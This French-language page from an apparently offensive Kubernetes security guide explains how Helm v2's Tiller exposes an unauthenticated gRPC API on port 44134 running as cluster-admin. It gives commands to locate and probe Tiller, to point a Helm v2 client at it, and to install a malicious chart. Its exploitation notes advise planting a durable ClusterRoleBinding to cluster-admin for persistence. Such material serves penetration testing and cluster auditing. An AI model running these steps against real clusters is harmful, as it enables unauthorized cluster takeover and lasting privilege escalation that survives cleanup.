---
title: "Helm Tiller : cluster-admin via l'ancien composant serveur de Helm"
order: 8
description: "Helm v2 exécutait un composant côté cluster, Tiller, généralement avec un compte de service cluster-admin et une API gRPC sur le port 44134 qui n'effectuait aucune authentification. Un pod capable d'atteindre Tiller soumet des opérations de chart que Tiller exécute avec ses propres droits cluster-admin, si bien qu'atteindre Tiller donne le contrôle total du cluster via un composant indépendant des permissions propres de l'attaquant."
keywords:
  - helm tiller
  - port 44134
  - helm v2
  - cluster-admin
  - unauthenticated
---

# Helm Tiller

Helm version 2 installait dans le cluster un composant côté serveur appelé Tiller pour appliquer les charts. Tiller tournait avec un compte de service qui, selon les instructions d'installation courantes, était lié à `cluster-admin`, et il exposait une API gRPC (port 44134) qui n'effectuait aucune authentification : tout client capable de l'atteindre pouvait lui demander d'installer ou de modifier des releases, que Tiller exécutait avec ses droits cluster-admin. Un pod capable d'atteindre Tiller hérite donc de cluster-admin, quelles que soient ses propres permissions. Helm 3 a supprimé Tiller, mais les clusters qui tournent encore sous Helm 2, ou avec un Tiller résiduel, restent exposés.

Trouver Tiller :

```bash
kubectl get pods -A | grep -i tiller
kubectl get svc -A | grep -i tiller                   # tiller-deploy, port 44134
# reachability from a pod
nc -z -w1 tiller-deploy.kube-system 44134 && echo reachable
```

## Abuser des privilèges de Tiller

```bash
# point a helm v2 client at the in-cluster Tiller and act through it
export HELM_HOST=tiller-deploy.kube-system:44134
helm2 ls                                               # lists releases via Tiller
# install a chart that creates a cluster-admin binding for the attacker,
# or a privileged pod; Tiller applies it as cluster-admin
helm2 install --name x ./evil-chart
```

Un chart malveillant minimal embarque un ClusterRoleBinding accordant à son compte de service `cluster-admin`, ou un pod privilégié ; Tiller le crée avec ses propres droits, de sorte que les contrôles anti-escalade habituels ne s'appliquent pas à l'attaquant.

## Notes d'exploitation

- L'exposition tient au fait que c'est Tiller, et non l'appelant, qui détient cluster-admin et n'authentifie personne, si bien que le seul verrou est l'accessibilité réseau au port 44134, couramment ouvert à tous les pods.
- Livrez un chart dont les templates créent un octroi durable (un ClusterRoleBinding vers `cluster-admin` pour votre compte de service) ; cela persiste après la suppression de Tiller, contrairement à une action ponctuelle.
- Cela ne concerne que les clusters de l'époque de Helm 2 ; vérifiez qu'un pod Tiller ou un service `tiller-deploy` existe avant de poursuivre.

## Outils

- [client helm v2](https://github.com/helm/helm/releases)

## Références

- [Helm v2 Tiller et sécurité](https://v2.helm.sh/docs/securing_installation/)
- [HackTricks : Helm Tiller](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
